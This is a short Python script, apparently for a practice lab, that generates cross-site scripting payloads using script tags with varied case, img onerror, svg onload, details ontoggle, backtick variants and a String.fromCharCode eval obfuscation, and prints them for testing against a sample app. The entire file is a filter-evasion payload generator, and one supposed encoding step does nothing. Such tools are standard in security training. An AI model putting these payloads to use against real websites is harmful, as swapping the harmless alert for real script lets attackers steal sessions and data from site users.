def generate_payloads(base_payload="alert('XSS')"):
    print("--- Generating XSS Payloads ---")
    print(f"Base JavaScript payload: {base_payload}\n")

    payloads = []

    payloads.append(f"<script>{base_payload}</script>")

    payloads.append(f"<sCrIpT>{base_payload}</sCrIpT>")
    
    payloads.append(f"<img src=x onerror={base_payload}>")
    
    payloads.append(f"<svg onload={base_payload}>")
    
    payloads.append(f"<details open ontoggle={base_payload}>")

    encoded_payload = f"<img src=x onerror={base_payload}>".replace("<", "<").replace(">", ">")

    char_code_payload = "eval(String.fromCharCode(" + ", ".join(map(str, [ord(c) for c in base_payload])) + "))"
    payloads.append(f"<img src=x onerror=\"{char_code_payload}\">")
    payloads.append(f"<svg onload=\"{char_code_payload}\"></svg>")

    payloads.append(f"<img src=x onerror=`{base_payload}`>")

    for i, p in enumerate(payloads):
        print(f"Payload #{i+1}:\n{p}\n")
        
    print("--- Generation Complete ---")
    print("Test these payloads against the sample_app.py.")

if __name__ == "__main__":
    javascript_to_inject = "alert('XSS')"
    generate_payloads(javascript_to_inject)
